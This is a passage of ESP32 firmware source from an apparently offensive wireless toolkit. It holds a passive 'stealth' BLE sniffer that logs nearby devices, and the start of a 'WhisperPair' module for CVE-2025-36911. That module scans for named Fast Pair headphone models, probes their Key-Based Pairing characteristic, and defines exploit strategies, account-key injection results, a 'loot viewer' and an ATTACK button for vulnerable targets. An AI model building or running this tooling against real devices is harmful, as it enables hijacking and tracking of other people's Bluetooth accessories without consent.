        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_BLACK);
        tft.setCursor(200, 274);
        tft.print("PAUSE");
    }
}

static void drawButtonBar() {
    tft.fillRect(0, 283, SCREEN_WIDTH, 37, HALEHOUND_GUNMETAL);

    // BACK button (x=5-42)
    tft.fillRect(5, 288, 37, 25, HALEHOUND_DARK);
    tft.drawRect(5, 288, 37, 25, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setCursor(8, 296);
    tft.print("BACK");

    // INFO button (x=47-82)
    uint16_t infoColor = (deviceCount > 0) ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(47, 288, 35, 25, HALEHOUND_DARK);
    tft.drawRect(47, 288, 35, 25, infoColor);
    tft.setTextColor(infoColor);
    tft.setCursor(52, 296);
    tft.print("INFO");

    // PREV button (x=87-117)
    uint16_t prevColor = (listStartIndex > 0) ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(87, 288, 30, 25, HALEHOUND_DARK);
    tft.drawRect(87, 288, 30, 25, prevColor);
    tft.setTextColor(prevColor);
    tft.setCursor(92, 296);
    tft.print("PRV");

    // Page indicator (x=120-160)
    int filtered = countFiltered();
    int totalPages = (filtered + BSNIFF_MAX_VISIBLE - 1) / BSNIFF_MAX_VISIBLE;
    if (totalPages < 1) totalPages = 1;
    int curPage = (listStartIndex / BSNIFF_MAX_VISIBLE) + 1;
    tft.fillRect(120, 288, 40, 25, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(127, 296);
    tft.printf("%d/%d", curPage, totalPages);

    // NEXT button (x=163-193)
    uint16_t nextColor = (listStartIndex + BSNIFF_MAX_VISIBLE < filtered) ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL;
    tft.fillRect(163, 288, 30, 25, HALEHOUND_DARK);
    tft.drawRect(163, 288, 30, 25, nextColor);
    tft.setTextColor(nextColor);
    tft.setCursor(168, 296);
    tft.print("NXT");

    // CLR button (x=198-233)
    tft.fillRect(198, 288, 35, 25, HALEHOUND_DARK);
    tft.drawRect(198, 288, 35, 25, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(205, 296);
    tft.print("CLR");
}

static void drawFullUI() {
    drawIconBar();
    drawHeader();
    drawColumnHeaders();
    drawDeviceList();
    drawStatsLine();
    drawButtonBar();
}

// ═══════════════════════════════════════════════════════════════════════════
// DETAIL VIEW (popup overlay)
// ═══════════════════════════════════════════════════════════════════════════

static void showDeviceDetail(int idx) {
    // Find the actual device index through the filter
    int filtIdx = 0;
    int realIdx = -1;
    for (int i = 0; i < deviceCount; i++) {
        if (!passesFilter(&devices[i])) continue;
        if (filtIdx == idx) { realIdx = i; break; }
        filtIdx++;
    }
    if (realIdx < 0 || realIdx >= deviceCount) return;

    BleDevice* d = &devices[realIdx];
    detailView = true;

    // Draw overlay
    tft.fillRect(10, 40, tft.width() - 20, tft.height() - 80, HALEHOUND_BLACK);
    tft.drawRect(10, 40, tft.width() - 20, tft.height() - 80, HALEHOUND_HOTPINK);
    tft.drawRect(11, 41, tft.width() - 22, tft.height() - 82, HALEHOUND_VIOLET);

    int y = 52;
    tft.setTextSize(1);

    // Name
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(18, y);
    tft.print("Name: ");
    tft.setTextColor(TFT_WHITE);
    tft.print(d->hasName ? d->name : "(none)");
    y += 16;

    // Full MAC
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(18, y);
    tft.print("MAC: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    char fullMac[18];
    snprintf(fullMac, sizeof(fullMac), "%02X:%02X:%02X:%02X:%02X:%02X",
             d->mac[0], d->mac[1], d->mac[2], d->mac[3], d->mac[4], d->mac[5]);
    tft.print(fullMac);
    y += 16;

    // Random MAC flag
    if (d->randomMAC) {
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(18, y);
        tft.print("(Locally Administered / Random)");
        y += 14;
    }

    // Type
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(18, y);
    tft.print("Type: ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print(devDisplayLabel(d->companyId, d->hasName));
    y += 16;

    // Vendor
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(18, y);
    tft.print("Vendor: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(d->vendor);
    y += 16;

    // RSSI current / min / max
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(18, y);
    tft.print("RSSI: ");
    tft.setTextColor(TFT_WHITE);
    tft.printf("%d dBm", d->rssi);
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.printf(" (%d/%d)", d->rssiMin, d->rssiMax);
    y += 16;

    // Frame count
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(18, y);
    tft.print("Frames: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(d->frameCount);
    y += 16;

    // First/Last seen
    uint32_t now = millis();
    uint32_t firstAge = (now - d->firstSeen) / 1000;
    uint32_t lastAge = (now - d->lastSeen) / 1000;

    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(18, y);
    tft.print("First: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.printf("%ds ago", firstAge);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(" Last: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.printf("%ds", lastAge);
    y += 16;

    // Manufacturer data hex dump
    if (d->mfgDataLen > 0) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(18, y);
        tft.print("MfgData: ");
        tft.setTextColor(HALEHOUND_VIOLET);
        for (int i = 0; i < d->mfgDataLen; i++) {
            tft.printf("%02X ", d->mfgData[i]);
        }
        y += 16;
    }

    // Close button
    y = 260;
    tft.fillRect(85, y, 70, 18, HALEHOUND_DARK);
    tft.drawRect(85, y, 70, 18, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(100, y + 4);
    tft.print("CLOSE");
}

// ═══════════════════════════════════════════════════════════════════════════
// TOUCH HANDLING
// ═══════════════════════════════════════════════════════════════════════════

// Touch-release tracking — prevents held finger from firing multiple actions
static bool waitForRelease = false;

static void handleTouch() {
    static unsigned long lastTap = 0;

    uint16_t tx, ty;
    bool touching = getTouchPoint(&tx, &ty);

    // Wait for finger to lift after any view-changing action
    if (waitForRelease) {
        if (!touching) waitForRelease = false;
        return;
    }

    if (!touching) return;
    if (millis() - lastTap < 400) return;  // 400ms debounce — CYD touch needs firm timing
    lastTap = millis();

    // ── Detail view: ONLY close via CLOSE button or back icon ────────────
    if (detailView) {
        // CLOSE button (x=85-155, y=255-280)
        if (ty >= 255 && ty <= 280 && tx >= 80 && tx <= 160) {
            detailView = false;
            waitForRelease = true;
            drawFullUI();
            return;
        }
        // Back icon in icon bar (x=10-26, y=20-36)
        if (ty >= 20 && ty <= 36 && tx >= 10 && tx < 30) {
            detailView = false;
            waitForRelease = true;
            drawFullUI();
            return;
        }
        // All other touches in detail view are ignored
        return;
    }

    // ── Icon bar (y=20-36) ───────────────────────────────────────────────
    if (ty >= 20 && ty <= 36) {
        for (int i = 0; i < BSNIFF_ICON_NUM; i++) {
            if (tx >= bsniffIconX[i] && tx < bsniffIconX[i] + BSNIFF_ICON_SIZE + 10) {
                switch (i) {
                    case 0:  // Back
                        exitRequested = true;
                        waitForRelease = true;
                        return;
                    case 1:  // Scan toggle
                        if (scanning) {
                            scanning = false;
                            if (pBleScan) pBleScan->stop();
                        } else {
                            scanning = true;
                            if (pBleScan) pBleScan->start(5, scanCompleteCallback, false);
                        }
                        waitForRelease = true;
                        drawIconBar();
                        drawStatsLine();
                        return;
                    case 2:  // Filter left
                        currentFilter = (SniffFilter)((currentFilter + FILT_COUNT - 1) % FILT_COUNT);
                        listStartIndex = 0;
                        currentIndex = 0;
                        waitForRelease = true;
                        drawHeader();
                        drawDeviceList();
                        drawStatsLine();
                        drawButtonBar();
                        return;
                    case 3:  // Filter right
                        currentFilter = (SniffFilter)((currentFilter + 1) % FILT_COUNT);
                        listStartIndex = 0;
                        currentIndex = 0;
                        waitForRelease = true;
                        drawHeader();
                        drawDeviceList();
                        drawStatsLine();
                        drawButtonBar();
                        return;
                    case 4:  // Eye/detail
                        if (deviceCount > 0) {
                            showDeviceDetail(currentIndex);
                            waitForRelease = true;
                        }
                        return;
                    case 5:  // BLE pulse (indicator only — no action)
                        return;
                }
            }
        }
        return;
    }

    // ── Device list area (y=74-272): tap to select ───────────────────────
    if (ty >= 74 && ty < 273 && deviceCount > 0) {
        int tappedRow = (ty - 74) / BSNIFF_ITEM_HEIGHT;
        int newIdx = listStartIndex + tappedRow;
        int filtered = countFiltered();
        if (newIdx < filtered) {
            currentIndex = newIdx;
            waitForRelease = true;
            drawDeviceList();
        }
        return;
    }

    // ── Button bar (y=283-318) ───────────────────────────────────────────
    if (ty >= 283) {
        waitForRelease = true;
        if (tx >= 5 && tx < 42) {
            // BACK
            exitRequested = true;
        } else if (tx >= 47 && tx < 82) {
            // INFO
            if (deviceCount > 0) showDeviceDetail(currentIndex);
        } else if (tx >= 87 && tx < 117) {
            // PREV
            if (listStartIndex >= BSNIFF_MAX_VISIBLE) {
                listStartIndex -= BSNIFF_MAX_VISIBLE;
                currentIndex = listStartIndex;
                drawDeviceList();
                drawButtonBar();
            }
        } else if (tx >= 163 && tx < 193) {
            // NEXT
            int filtered = countFiltered();
            if (listStartIndex + BSNIFF_MAX_VISIBLE < filtered) {
                listStartIndex += BSNIFF_MAX_VISIBLE;
                currentIndex = listStartIndex;
                drawDeviceList();
                drawButtonBar();
            }
        } else if (tx >= 198 && tx < 233) {
            // CLR
            deviceCount = 0;
            currentIndex = 0;
            listStartIndex = 0;
            scanStartTime = millis();
            drawHeader();
            drawDeviceList();
            drawStatsLine();
            drawButtonBar();
            #if CYD_DEBUG
            Serial.println("[BSNIFF] Device list cleared");
            #endif
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SETUP / LOOP / CLEANUP
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BSNIFF] Initializing BLE Sniffer...");
    #endif

    // Reset state
    deviceCount = 0;
    currentIndex = 0;
    listStartIndex = 0;
    currentFilter = FILT_ALL;
    exitRequested = false;
    detailView = false;
    waitForRelease = false;
    pendingReady = false;
    scanStartTime = millis();
    lastDisplayUpdate = 0;

    // Draw initial UI
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Tear down WiFi before BLE init — frees ~50KB heap
    WiFi.mode(WIFI_OFF);
    delay(50);

    // BLE init
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);  // Race condition fix — BLE controller needs time

    pBleScan = BLEDevice::getScan();
    if (!pBleScan) {
        #if CYD_DEBUG
        Serial.println("[BSNIFF] ERROR: getScan() returned NULL");
        #endif
        exitRequested = true;
        return;
    }

    pBleScan->setActiveScan(false);  // PASSIVE — no SCAN_REQ sent, stealth mode
    pBleScan->setInterval(100);      // Scan timing (wardriving pattern)
    pBleScan->setWindow(99);         // Near-continuous listening
    pBleScan->setAdvertisedDeviceCallbacks(&snifferCB, true);  // wantDuplicates = true

    scanning = true;
    initialized = true;

    drawFullUI();

    // Start continuous non-blocking scan
    pBleScan->start(5, scanCompleteCallback, false);

    #if CYD_DEBUG
    Serial.println("[BSNIFF] Passive scanning started");
    #endif
}

void loop() {
    if (!initialized) return;

    // Process pending device from BLE callback
    if (pendingReady) {
        addOrUpdateDevice(pendingMAC, pendingRSSI, pendingName,
                          pendingHasName, pendingMfgData, pendingMfgLen);
        pendingReady = false;
    }

    // Throttled display update (500ms)
    unsigned long now = millis();
    if (now - lastDisplayUpdate > 500 && !detailView) {
        drawHeader();
        drawDeviceList();
        drawStatsLine();
        drawButtonBar();
        lastDisplayUpdate = now;
    }

    // Touch handling — ALL navigation goes through handleTouch()
    // DO NOT use buttonPressed() — CYD touch zones (BTN_BACK=x160-240 y0-60,
    // BTN_UP=x0-80 y0-60, BTN_SELECT=x80-160 y130-190) overlap our icon bar
    // and device list, causing phantom exits and misfires
    handleTouch();

    // Physical BOOT button — uses IS_BOOT_PRESSED() macro (returns false on E32R28T
    // where GPIO0 is permanently LOW due to CC1101 E07 PA module)
    static unsigned long lastBootPress = 0;
    if (IS_BOOT_PRESSED() && millis() - lastBootPress > 500) {
        lastBootPress = millis();
        if (detailView) {
            detailView = false;
            waitForRelease = true;
            drawFullUI();
        } else {
            exitRequested = true;
        }
    }
}

bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pBleScan) {
        if (scanning) pBleScan->stop();
        pBleScan->setAdvertisedDeviceCallbacks(nullptr, false);  // Deregister callback so BleScan gets clean scan object
    }
    scanning = false;
    BLEDevice::deinit(false);  // MUST be false — deinit(true) bug never resets initialized flag
    pBleScan = nullptr;
    initialized = false;
    exitRequested = false;
    detailView = false;
    waitForRelease = false;
    pendingReady = false;

    // Restore WiFi for other modules
    WiFi.mode(WIFI_STA);

    #if CYD_DEBUG
    Serial.println("[BSNIFF] Cleanup complete — deinit(false)");
    #endif
}

}  // namespace BleSniffer


// ═══════════════════════════════════════════════════════════════════════════
// WHISPERPAIR - CVE-2025-36911 Fast Pair Vulnerability Scanner
// Scans for Google Fast Pair devices and probes for WhisperPair vulnerability
// Phase 1: Discovery + GATT Service Probe
// ═══════════════════════════════════════════════════════════════════════════

namespace WhisperPair {

// ─── Constants ───────────────────────────────────────────────────────────
#define WP_MAX_DEVICES 16
#define WP_LINE_HEIGHT 16
#define WP_MAX_VISIBLE 12
#define WP_SCAN_SECS 8

// ─── Probe Result Codes ──────────────────────────────────────────────────
#define WPR_NONE        0   // Not probed yet
#define WPR_UNREACHABLE 1   // GATT connection failed
#define WPR_NO_SERVICE  2   // Fast Pair service not found
#define WPR_NO_CHAR     3   // KBP characteristic not found (patched)
#define WPR_EXPOSED     4   // KBP char found outside pairing mode
#define WPR_VULNERABLE  5   // Device responded to KBP request

// ─── Known Fast Pair Model IDs ───────────────────────────────────────────
// Same model IDs as BleSpoofer FAST_PAIR_MODELS array (verified working)
struct WPModel {
    uint8_t id[3];
    const char* name;
};

static const WPModel wpModels[] = {
    {{0xD9, 0x93, 0x30}, "Pixel Buds Pro"},
    {{0x82, 0x1F, 0x66}, "Pixel Buds A"},
    {{0x71, 0x7F, 0x41}, "Pixel Buds"},
    {{0xF5, 0x24, 0x94}, "Sony WH-XM4"},
    {{0xF0, 0x09, 0x17}, "Sony WH-XM5"},
    {{0x01, 0x00, 0x06}, "Bose NC 700"},
    {{0xEF, 0x44, 0x63}, "Bose QC Ultra"},
    {{0x03, 0x1E, 0x06}, "JBL Flip 6"},
    {{0x92, 0xB2, 0x5E}, "JBL LivePro2"},
    {{0x1E, 0x89, 0xA7}, "Razer HH"},
    {{0x02, 0xAA, 0x91}, "Jabra 75t"},
    {{0x2D, 0x7A, 0x23}, "Nothing Ear1"},
    {{0xD4, 0x46, 0xA7}, "Sony LinkBuds"},
    {{0x72, 0xEF, 0x62}, "Gal Buds FE"},
    {{0xF5, 0x8D, 0x14}, "JBL Buds Pro"},
};
#define WP_MODEL_COUNT (sizeof(wpModels) / sizeof(wpModels[0]))

// ─── Device Info ─────────────────────────────────────────────────────────
struct FPDevice {
    char addrStr[18];               // "AA:BB:CC:DD:EE:FF"
    esp_ble_addr_type_t addrType;
    uint32_t modelId;
    int rssi;
    char name[24];
    uint8_t result;                 // WPR_* code
};

// ─── State ───────────────────────────────────────────────────────────────
static bool wpInit = false;
static bool wpExit = false;
static bool inResult = false;
static FPDevice wpDevs[WP_MAX_DEVICES];
static int wpCount = 0;
static int wpCurIdx = 0;
static int wpListStart = 0;
static int wpProbeIdx = -1;
static BLEScan* pWpScan = nullptr;
static BLEClient* pWpClient = nullptr;
static volatile bool wpNotifRx = false;
static uint8_t wpNotifData[20];
static size_t wpNotifLen = 0;

// GATT UUIDs
static BLEUUID wpFpUUID16((uint16_t)0xFE2C);
static BLEUUID wpFpUUID128("0000fe2c-0000-1000-8000-00805f9b34fb");
static BLEUUID wpKbpUUID("fe2c1234-8366-4814-8eb0-01de32100bea");

// Icon bar
static int wpIconX[2] = {210, 10};
static int wpIconY = 20;

// Attack-phase UUIDs created as locals in wpRunAttack() to save DRAM

// ─── KBP Exploit Strategies ─────────────────────────────────────────────
struct WPStrategy {
    const char* name;
    uint8_t flags;
};

static const WPStrategy wpStrategies[] = {
    {"RAW_KBP",      0x11},
    {"WITH_SEEKER",  0x02},
    {"RETROACTIVE",  0x0A},
    {"EXTENDED",     0x10},
};

// ─── Attack Result ──────────────────────────────────────────────────────
struct WPAttackResult {
    bool phase1Done;
    bool phase2Done;
    bool phase3Done;
    int  strategyUsed;          // which strategy got first response (-1 = none)
    uint8_t brEdrAddr[6];       // extracted BR/EDR (Classic BT) address
    bool hasBrEdr;
    uint8_t kbpResp[20];        // raw KBP notification response
    size_t  kbpRespLen;
    bool acctKeyWritten;        // Phase 2 success
    uint8_t acctKey[16];        // the account key we injected
    bool hasPasskey;            // Phase 3 — passkey char exists
    bool hasAdditional;         // Phase 3 — additional data char exists
    uint8_t modelIdBytes[3];    // from GATT char read
    bool hasModelId;
    char firmware[20];          // firmware revision string
    bool hasFirmware;
    uint8_t strategyResults[4]; // 0=not tried, 1=fail, 2=success
};

// ─── Attack State ───────────────────────────────────────────────────────
static bool inAttack = false;
static bool inAttackResult = false;
static bool inLootViewer = false;
static int  atkResultPage = 0;
static WPAttackResult wpAtkResult;

// ─── Attack Scrolling Log ───────────────────────────────────────────────
#define WP_ATK_LOG_LINES 10
#define WP_ATK_LOG_WIDTH 36
static char wpAtkLog[WP_ATK_LOG_LINES][WP_ATK_LOG_WIDTH];
static uint16_t wpAtkLogColors[WP_ATK_LOG_LINES];
static int wpAtkLogCount = 0;

// ─── Helpers ─────────────────────────────────────────────────────────────
static const char* wpLookupModel(uint32_t mid) {
    for (int i = 0; i < (int)WP_MODEL_COUNT; i++) {
        uint32_t m = ((uint32_t)wpModels[i].id[0] << 16) |
                     ((uint32_t)wpModels[i].id[1] << 8) |
                     wpModels[i].id[2];
        if (m == mid) return wpModels[i].name;
    }
    return nullptr;
}

static const char* wpResultStr(uint8_t r) {
    switch (r) {
        case WPR_UNREACHABLE: return "UNREACHABLE";
        case WPR_NO_SERVICE:  return "NO FP SERVICE";
        case WPR_NO_CHAR:     return "SECURE";
        case WPR_EXPOSED:     return "EXPOSED";
        case WPR_VULNERABLE:  return "VULNERABLE";
        default:              return "NOT TESTED";
    }
}

static uint16_t wpResultColor(uint8_t r) {
    switch (r) {
        case WPR_NO_CHAR:     return 0x07E0;   // Green
        case WPR_EXPOSED:     return 0xFFE0;   // Yellow
        case WPR_VULNERABLE:  return 0xF800;   // Red
        default:              return HALEHOUND_GUNMETAL;
    }
}

// ─── Notification Callback ───────────────────────────────────────────────
static void wpNotifyCb(BLERemoteCharacteristic* pChar, uint8_t* data, size_t len, bool isNotify) {
    wpNotifRx = true;
    wpNotifLen = (len > 20) ? 20 : len;
    memcpy(wpNotifData, data, wpNotifLen);
    #if CYD_DEBUG
    Serial.printf("[WP] KBP notification received! len=%d\n", len);
    for (size_t i = 0; i < wpNotifLen; i++) Serial.printf("%02X ", wpNotifData[i]);
    Serial.println();
    #endif
}

// ─── UI Drawing ──────────────────────────────────────────────────────────
static void wpDrawHeader() {
    tft.drawLine(0, 19, tft.width(), 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.drawBitmap(wpIconX[0], wpIconY, bitmap_icon_undo, 16, 16, HALEHOUND_MAGENTA);
    tft.drawBitmap(wpIconX[1], wpIconY, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawBitmap(112, wpIconY, bitmap_icon_sdcard, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
    // Nosifer glitch title — chromatic aberration effect
    drawGlitchTitle(55, "WHISPERPAIR");
    // CVE subtitle centered in electric blue
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    int cveW = 14 * 6;
    tft.setCursor((SCREEN_WIDTH - cveW) / 2, 68);
    tft.print("CVE-2025-36911");
}

static void wpDrawList() {
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    // Sub-header bar — dark background like spoofer mode bar
    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("Fast Pair Targets: ");
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.print(wpCount);
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, HALEHOUND_HOTPINK);

    if (wpCount == 0) {
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.setCursor(10, 105);
        tft.print("No Fast Pair devices");
        tft.setCursor(10, 120);
        tft.print("found nearby.");
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(10, 145);
        tft.print("Ensure targets are powered");
        tft.setCursor(10, 158);
        tft.print("on and within BLE range.");
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(5, SCREEN_HEIGHT - 12);
        tft.print("SEL=Rescan  BACK=Exit");
        return;
    }

    int y = 98;
    for (int i = 0; i < WP_MAX_VISIBLE && i + wpListStart < wpCount; i++) {
        int idx = i + wpListStart;
        FPDevice& d = wpDevs[idx];

        if (idx == wpCurIdx) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, WP_LINE_HEIGHT, HALEHOUND_DARK);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(5, y);
            tft.print("> ");
        } else {
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(5, y);
            tft.print("  ");
        }

        tft.setCursor(20, y);
        String nm = String(d.name).substring(0, 14);
        tft.print(nm);

        if (d.result != WPR_NONE) {
            tft.setCursor(SCREEN_WIDTH - 65, y);
            tft.setTextColor(wpResultColor(d.result));
            if (d.result == WPR_VULNERABLE) tft.print("VULN");
            else if (d.result == WPR_EXPOSED) tft.print("EXPD");
            else if (d.result == WPR_NO_CHAR) tft.print("OK");
            else tft.print("--");
        } else {
            tft.setCursor(SCREEN_WIDTH - 50, y);
            tft.setTextColor(HALEHOUND_VIOLET);
            tft.print(d.rssi);
            tft.print("dB");
        }

        y += WP_LINE_HEIGHT;
    }

    tft.drawLine(0, SCREEN_HEIGHT - 18, SCREEN_WIDTH, SCREEN_HEIGHT - 18, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("SEL=Probe UP/DN=Nav L=Scan");
}

static void wpDrawProbeStatus(int line, const char* msg, uint16_t col) {
    int y = 135 + line * 15;
    tft.fillRect(0, y, SCREEN_WIDTH, 14, HALEHOUND_BLACK);
    tft.setTextColor(col);
    tft.setCursor(10, y);
    tft.print(msg);
}

static void wpDrawResult() {
    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);

    FPDevice& d = wpDevs[wpProbeIdx];

    // Sub-header bar
    tft.fillRect(0, 78, SCREEN_WIDTH, 16, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 82);
    tft.print("PROBE RESULT");
    tft.drawLine(0, 94, SCREEN_WIDTH, 94, HALEHOUND_HOTPINK);

    int y = 100;
    // Labels in electric blue, values in hot pink
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("Name: ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.name);
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("MAC:  ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.addrStr);
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, y); tft.print("RSSI: ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(d.rssi); tft.print(" dBm");
    y += 15;
    tft.setTextColor(HALEHOUND_MAGENTA);
    char modelHex[16];
    snprintf(modelHex, sizeof(modelHex), "0x%06X", d.modelId);
    tft.setCursor(10, y); tft.print("Model: ");
    tft.setTextColor(HALEHOUND_HOTPINK); tft.print(modelHex);
    y += 20;

    // Result banner with rounded border
    tft.drawLine(0, y - 4, SCREEN_WIDTH, y - 4, HALEHOUND_DARK);
    uint16_t rc = wpResultColor(d.result);
    tft.fillRoundRect(8, y, SCREEN_WIDTH - 16, 26, 4, rc);
    tft.drawRoundRect(7, y - 1, SCREEN_WIDTH - 14, 28, 4, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_BLACK);
    const char* rs = wpResultStr(d.result);
    int tw = strlen(rs) * 6;
    tft.setCursor((SCREEN_WIDTH - tw) / 2, y + 8);
    tft.print(rs);
    y += 36;

    // Explanation text
    tft.setTextColor(HALEHOUND_MAGENTA);
    switch (d.result) {
        case WPR_VULNERABLE:
            tft.setCursor(10, y);
            tft.print("Device responded to KBP");
            tft.setCursor(10, y + 14);
            tft.print("request outside pair mode");
            tft.setCursor(10, y + 30);
            tft.setTextColor(0xF800);
            tft.print("CVE-2025-36911 CONFIRMED");
            break;
        case WPR_EXPOSED:
            tft.setCursor(10, y);
            tft.print("KBP characteristic found");
            tft.setCursor(10, y + 14);
            tft.print("outside pairing mode.");
            tft.setCursor(10, y + 30);
            tft.setTextColor(0xFFE0);
            tft.print("Potentially vulnerable");
            break;
        case WPR_NO_CHAR:
            tft.setCursor(10, y);
            tft.print("FP service present but");
            tft.setCursor(10, y + 14);
            tft.print("KBP char not exposed.");
            tft.setCursor(10, y + 30);
            tft.setTextColor(0x07E0);
            tft.print("Appears patched");
            break;
        case WPR_NO_SERVICE:
            tft.setCursor(10, y);
            tft.print("Fast Pair GATT service");
            tft.setCursor(10, y + 14);
            tft.print("not accessible via GATT");
            break;
        case WPR_UNREACHABLE:
            tft.setCursor(10, y);
            tft.print("GATT connection failed.");
            tft.setCursor(10, y + 14);
            tft.print("Target may be out of range");
            break;
    }

    // Bottom bar with ATTACK button for vulnerable devices
    tft.drawLine(0, SCREEN_HEIGHT - 38, SCREEN_WIDTH, SCREEN_HEIGHT - 38, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK");

    if (d.result == WPR_EXPOSED || d.result == WPR_VULNERABLE) {
        tft.fillRoundRect(140, SCREEN_HEIGHT - 34, 92, 26, 4, 0xF800);
        tft.drawRoundRect(139, SCREEN_HEIGHT - 35, 94, 28, 4, HALEHOUND_MAGENTA);
        tft.drawBitmap(146, SCREEN_HEIGHT - 29, bitmap_icon_sword, 16, 16, HALEHOUND_BLACK);
        tft.setTextColor(HALEHOUND_BLACK);
        tft.setCursor(166, SCREEN_HEIGHT - 25);
        tft.print("ATTACK");
    }
}

// ─── Scan ────────────────────────────────────────────────────────────────
static void wpDoScan() {
    wpCount = 0;
    wpCurIdx = 0;
    wpListStart = 0;

    tft.fillRect(0, 78, SCREEN_WIDTH, SCREEN_HEIGHT - 78, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 88);
    tft.print("[*] FAST PAIR SCAN ACTIVE");
    tft.drawLine(10, 98, 200, 98, HALEHOUND_DARK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, 108);
    tft.print("Hunting targets...");
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, 128);
    tft.print("Scan duration: ");
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(WP_SCAN_SECS);
    tft.print("s");

    BLEScanResults results = pWpScan->start(WP_SCAN_SECS, false);

    int total = results.getCount();
    #if CYD_DEBUG
    Serial.printf("[WP] Scan got %d total BLE devices\n", total);
    #endif

    for (int i = 0; i < total && wpCount < WP_MAX_DEVICES; i++) {
        BLEAdvertisedDevice device = results.getDevice(i);
        if (!device.haveServiceData()) continue;

        BLEUUID sdUUID = device.getServiceDataUUID();
        if (!sdUUID.equals(BLEUUID((uint16_t)0xFE2C))) continue;

        std::string sd = device.getServiceData();
        if (sd.length() < 3) continue;

        // Check duplicate MAC
        String addr = String(device.getAddress().toString().c_str());
        bool dup = false;
        for (int j = 0; j < wpCount; j++) {
            if (addr.equals(wpDevs[j].addrStr)) { dup = true; break; }
        }
        if (dup) continue;

        FPDevice& d = wpDevs[wpCount];
        strncpy(d.addrStr, addr.c_str(), 17);
        d.addrStr[17] = '\0';
        d.addrType = device.getAddressType();
        d.rssi = device.getRSSI();
        d.result = WPR_NONE;

        // Extract model ID (3 bytes big-endian)
        d.modelId = ((uint32_t)(uint8_t)sd[0] << 16) |
                    ((uint32_t)(uint8_t)sd[1] << 8)  |
                    (uint8_t)sd[2];

        const char* known = wpLookupModel(d.modelId);
        if (known) {
            strncpy(d.name, known, 23);
        } else if (device.getName().length() > 0) {
            strncpy(d.name, device.getName().c_str(), 23);
        } else {
            snprintf(d.name, 24, "FP:%06X", d.modelId);
        }
        d.name[23] = '\0';

        wpCount++;

        #if CYD_DEBUG
        Serial.printf("[WP] FP device: %s [%s] RSSI:%d Model:0x%06X\n",
